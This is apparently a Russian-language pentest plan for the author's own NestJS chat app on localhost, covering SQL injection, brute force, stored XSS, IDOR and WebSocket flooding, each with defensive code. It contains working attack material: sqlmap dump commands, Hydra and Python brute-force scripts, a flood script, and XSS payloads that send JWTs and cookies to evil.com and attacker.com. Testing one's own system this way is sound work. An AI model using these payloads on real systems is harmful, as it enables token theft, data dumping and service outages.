# Сценарии кибератак и моделирование

## 1. Введение

Данный документ описывает сценарии возможных кибератак на систему NestJS Chat и их моделирование в виртуальной среде для тестирования защитных механизмов.

---

## 2. Сценарий №1: SQL-инъекция через аутентификацию

### 2.1 Описание атаки

**Цель**: Получение доступа к базе данных через уязвимый endpoint `/auth/login`

**Тип**: Blind SQL Injection / Error-based SQL Injection

**Инструменты**:

- SQLMap (автоматизированная эксплуатация)
- Burp Suite (ручное тестирование)

### 2.2 Пошаговый сценарий

#### Фаза 1: Разведка

```bash
# 1. Изучение Swagger документации
curl http://localhost:3001/api

# 2. Анализ структуры запросов
curl -X POST http://localhost:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

#### Фаза 2: Тестирование уязвимости

```bash
# Тест 1: Простая инъекция
curl -X POST http://localhost:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'

# Тест 2: Union-based
curl -X POST http://localhost:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' UNION SELECT password FROM users --","password":"any"}'
```

#### Фаза 3: Эксплуатация с SQLMap

```bash
# Автоматизированная атака
cd ChatDiffieHelman.Api/security-testing
python sqlmap_automation.py

# Целевое тестирование
sqlmap -u "http://localhost:3001/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=5 --risk=3 \
  --technique=BEUSTQ \
  --dbms=postgresql \
  --dump
```

### 2.3 Ожидаемые результаты

**Если уязвимо**:

```
[INFO] testing 'PostgreSQL > 8.1 stacked queries'
[INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 stacked queries' injectable
Database: public
Table: users
[3 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | $2b$12$HashedPasswordHere...           |
| 2  | user1    | $2b$12$HashedPasswordHere...           |
| 3  | user2    | $2b$12$HashedPasswordHere...           |
+----+----------+----------------------------------+
```

**Если защищено**:

```
[WARNING] POST parameter 'username' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

### 2.4 Меры противодействия

✅ **Защита**:

```typescript
// НЕ ИСПОЛЬЗОВАТЬ:
const query = `SELECT * FROM users WHERE username='${username}'`;

// ИСПОЛЬЗОВАТЬ (параметризованный запрос):
const user = await this.userRepository.findOne({
  where: { username },
});

// Или с TypeORM Query Builder:
const user = await this.userRepository
  .createQueryBuilder("user")
  .where("user.username = :username", { username })
  .getOne();
```

---

## 3. Сценарий №2: Брутфорс атака на аутентификацию

### 3.1 Описание

**Цель**: Подбор пароля для компрометации учетной записи

**Инструменты**:

- Hydra
- Burp Suite Intruder
- Custom Python script

### 3.2 Пошаговый сценарий

#### Шаг 1: Подготовка словаря

```bash
# Создание словаря паролей
cat > passwords.txt << EOF
password
123456
qwerty
admin
welcome
P@ssw0rd
test1234
EOF
```

#### Шаг 2: Атака с Hydra

```bash
# Брутфорс через HTTP POST
hydra -l admin -P passwords.txt \
  localhost -s 3001 \
  http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 4 -w 30
```

#### Шаг 3: Python скрипт для автоматизации

```python
import requests
import time

API_URL = "http://localhost:3001/auth/login"
passwords = ["password", "123456", "qwerty", "admin"]

for password in passwords:
    start_time = time.time()
    response = requests.post(API_URL, json={
        "username": "admin",
        "password": password
    })
    elapsed = time.time() - start_time

    print(f"[{response.status_code}] Password: {password} - Time: {elapsed:.2f}s")

    if response.status_code == 200:
        print(f"✓ SUCCESS! Password found: {password}")
        print(f"Token: {response.json().get('accessToken')}")
        break
    elif response.status_code == 429:
        print("✗ Rate limited. Waiting...")
        time.sleep(60)
```

### 3.3 Результаты

**Без защиты (УЯЗВИМО)**:

```
[200] Password: admin - Time: 0.12s
✓ SUCCESS! Password found: admin
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**С rate limiting (ЗАЩИЩЕНО)**:

```
[401] Password: password - Time: 0.15s
[401] Password: 123456 - Time: 0.14s
[401] Password: qwerty - Time: 0.16s
[429] Too Many Requests - Time: 0.05s
✗ Rate limited. Waiting...
```

### 3.4 Защита

```typescript
// NestJS - rate limiting
import { ThrottlerModule } from "@nestjs/throttler";

@Module({
  imports: [
    ThrottlerModule.forRoot({
      ttl: 900, // 15 минут
      limit: 5, // 5 попыток
    }),
  ],
})
// Custom guard для блокировки по IP
@Injectable()
export class LoginThrottlerGuard extends ThrottlerGuard {
  async handleRequest(context: ExecutionContext, limit: number, ttl: number) {
    const request = context.switchToHttp().getRequest();
    const ip = request.ip;
    const username = request.body.username;

    // Блокировка на 30 минут после 5 неудачных попыток
    const key = `login_attempts:${ip}:${username}`;
    const attempts = await this.redis.get(key);

    if (attempts && parseInt(attempts) >= 5) {
      throw new TooManyRequestsException(
        "Account locked for 30 minutes due to too many failed attempts",
      );
    }

    return super.handleRequest(context, limit, ttl);
  }
}
```

---

## 4. Сценарий №3: XSS атака через сообщения чата

### 4.1 Описание

**Тип**: Stored XSS (постоянное внедрение)

**Цель**: Кража JWT токена через внедренный JavaScript

### 4.2 Полезные нагрузки (Payloads)

```html
<!-- Payload 1: Простой alert -->
<script>alert('XSS')</script>

<!-- Payload 2: Кража токена -->
<script>
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))
</script>

<!-- Payload 3: Обход фильтров (img onerror) -->
<img src=x onerror="fetch('https://evil.com/log?cookie='+document.cookie)">

<!-- Payload 4: DOM-based XSS -->
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Payload 5: SVG XSS -->
<svg onload="alert('XSS')">

<!-- Payload 6: Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 4.3 Сценарий атаки

#### Шаг 1: Отправка зловредного сообщения

```bash
curl -X POST http://localhost:3001/messages \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "chatId": 1,
    "content": "<script>fetch(\"https://evil.com/steal?token=\" + localStorage.getItem(\"jwt\"))</script>"
  }'
```

#### Шаг 2: Жертва открывает чат

```javascript
// Если НЕ санитизируется, выполнится:
fetch("https://evil.com/steal?token=" + localStorage.getItem("jwt")).then(
  (response) => console.log("Token stolen!"),
);
```

### 4.4 Защита

**Backend (NestJS)**:

```typescript
import sanitizeHtml from 'sanitize-html';

@Post('messages')
async createMessage(@Body() dto: MessageDto) {
  // Санитизация HTML
  const sanitized = sanitizeHtml(dto.content, {
    allowedTags: [], // Запрещаем все теги
    allowedAttributes: {}
  });

  return this.messageService.create({
    ...dto,
    content: sanitized
  });
}
```

**Frontend (Angular)**:

```typescript
import DOMPurify from 'dompurify';

// Санитизация перед отображением
displayMessage(message: string): string {
  return DOMPurify.sanitize(message);
}

// В шаблоне использовать textContent вместо innerHTML
<div [textContent]="message.content"></div>
// ИЛИ с санитизацией:
<div [innerHTML]="displayMessage(message.content)"></div>
```

**Content Security Policy (CSP)**:

```typescript
// main.ts
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
  }),
);
```

---

## 5. Сценарий №4: IDOR (Insecure Direct Object Reference)

### 5.1 Описание

**Цель**: Доступ к ресурсам других пользователей через изменение ID

### 5.2 Сценарий

```bash
# Пользователь A (ID=1, JWT_A)
# Пользователь B (ID=2, JWT_B)

# Попытка A получить профиль B
curl -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/users/2

# Попытка A читать чужие сообщения
curl -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/chats/999/messages

# Попытка A удалить чужой чат
curl -X DELETE \
     -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/chats/999
```

### 5.3 Защита

```typescript
@Get(':id')
async getUser(
  @Param('id') id: string,
  @Req() req: Request
) {
  // Проверка: пользователь может видеть только свой профиль
  if (req.user.id !== id && !req.user.isAdmin) {
    throw new ForbiddenException('Access denied');
  }

  return this.userService.findOne(id);
}

@Get(':chatId/messages')
async getMessages(
  @Param('chatId') chatId: string,
  @Req() req: Request
) {
  // Проверка: пользователь - участник чата?
  const chat = await this.chatService.findOne(chatId);

  if (!chat.participants.includes(req.user.id)) {
    throw new ForbiddenException('You are not a participant of this chat');
  }

  return this.messageService.findByChatId(chatId);
}
```

---

## 6. Сценарий №5: DoS атака на WebSocket

### 6.1 Описание

**Цель**: Перегрузка WebSocket сервера массовым подключением или флудом

### 6.2 Инструменты

```python
# flood_websocket.py
import asyncio
import websockets

async def flood():
    tasks = []
    for i in range(10000):  # 10k подключений
        tasks.append(connect_and_spam(i))
    await asyncio.gather(*tasks)

async def connect_and_spam(client_id):
    async with websockets.connect('ws://localhost:3001') as ws:
        for _ in range(1000):  # 1000 сообщений на клиента
            await ws.send(json.dumps({
                "event": "message",
                "data": {"chatId": 1, "content": f"Spam {client_id}"}
            }))

asyncio.run(flood())
```

### 6.3 Защита

```typescript
// WebSocket Gateway
@WebSocketGateway({
  cors: { origin: ["http://localhost:4200"] },
})
export class ChatGateway {
  private connectionLimits = new Map<string, number>();

  @WebSocketServer()
  server: Server;

  handleConnection(client: Socket) {
    const ip = client.handshake.address;

    // Лимит подключений с одного IP
    const connections = this.connectionLimits.get(ip) || 0;
    if (connections >= 10) {
      client.disconnect();
      return;
    }

    this.connectionLimits.set(ip, connections + 1);
  }

  @SubscribeMessage("message")
  @UseGuards(WsThrottlerGuard) // Rate limiting
  async handleMessage(
    @MessageBody() data: any,
    @ConnectedSocket() client: Socket,
  ) {
    // Обработка сообщения
  }
}

// Rate limiting для WebSocket
@Injectable()
export class WsThrottlerGuard implements CanActivate {
  private messageCount = new Map<string, { count: number; reset: number }>();

  canActivate(context: ExecutionContext): boolean {
    const client = context.switchToWs().getClient();
    const userId = client.user?.id;

    if (!userId) return false;

    const now = Date.now();
    const userLimit = this.messageCount.get(userId);

    if (!userLimit || now > userLimit.reset) {
      this.messageCount.set(userId, { count: 1, reset: now + 60000 });
      return true;
    }

    if (userLimit.count >= 100) {
      // 100 сообщений в минуту
      return false;
    }

    userLimit.count++;
    return true;
  }
}
```

---

## 7. Виртуальная среда для тестирования

### 7.1 Настройка Kali Linux (WSL2 или VM)

```bash
# Windows - WSL2
wsl --install -d kali-linux

# Запуск Kali
wsl -d kali-linux

# Обновление и установка инструментов
sudo apt update && sudo apt upgrade -y
sudo apt install -y sqlmap hydra burpsuite zaproxy metasploit-framework
```

### 7.2 Docker-compose для изолированного тестирования

```yaml
# docker-compose.test.yml
version: "3.8"
services:
  api:
    build: ./ChatDiffieHelman.Api
    ports:
      - "3001:3001"
    environment:
      - NODE_ENV=test
      - DB_HOST=db

  db:
    image: postgres:15
    environment:
      - POSTGRES_DB=chatdb_test
      - POSTGRES_PASSWORD=testpass

  kali:
    image: kalilinux/kali-rolling
    network_mode: "host"
    volumes:
      - ./security-testing:/tests
    command: tail -f /dev/null
```

```bash
# Запуск тестовой среды
docker-compose -f docker-compose.test.yml up -d

# Вход в Kali контейнер
docker exec -it kali_container bash

# Запуск SQLMap из контейнера
cd /tests
./run_sqlmap_tests.sh
```

---

## 8. Чек-лист моделирования атак

- [ ] **SQL-инъекция**: Запуск SQLMap automation на все 23 эндпоинта
- [ ] **Брутфорс**: Тест с Hydra на /auth/login (проверка rate limiting)
- [ ] **XSS**: Инъекция скриптов в сообщения, имена пользователей
- [ ] **CSRF**: Попытка выполнить действия с другого origin
- [ ] **IDOR**: Попытка доступа к чужим ресурсам (чаты, сообщения, профили)
- [ ] **DoS/DDoS**: Flood-тест на API и WebSocket
- [ ] **MITM**: Проверка принудительного HTTPS, HSTS
- [ ] **JWT манипуляция**: Изменение payload, удаление подписи, истекший токен

---

## 9. Отчет по результатам моделирования

**Шаблон отчета**:

| Сценарий             | Статус         | Уязвимо? | Серьезность    | Рекомендация                       |
| -------------------- | -------------- | -------- | -------------- | ---------------------------------- |
| SQL-инъекция (login) | Протестировано | ❌ Нет   | N/A            | Параметризованные запросы работают |
| Брутфорс (login)     | Протестировано | ✅ Да    | 🔴 Критическая | Внедрить rate limiting             |
| XSS (messages)       | Требует теста  | ❓       | 🔴 Высокая     | Добавить санитизацию               |
| IDOR (users/:id)     | Требует теста  | ❓       | 🔴 Высокая     | Проверка прав доступа              |
| DoS (WebSocket)      | Требует теста  | ❓       | 🟡 Средняя     | Connection limiting                |

---

**Дата проведения**: 20 ноября 2025  
**Тестировщик**: Specialist по реагированию на инциденты  
**Версия**: 1.0
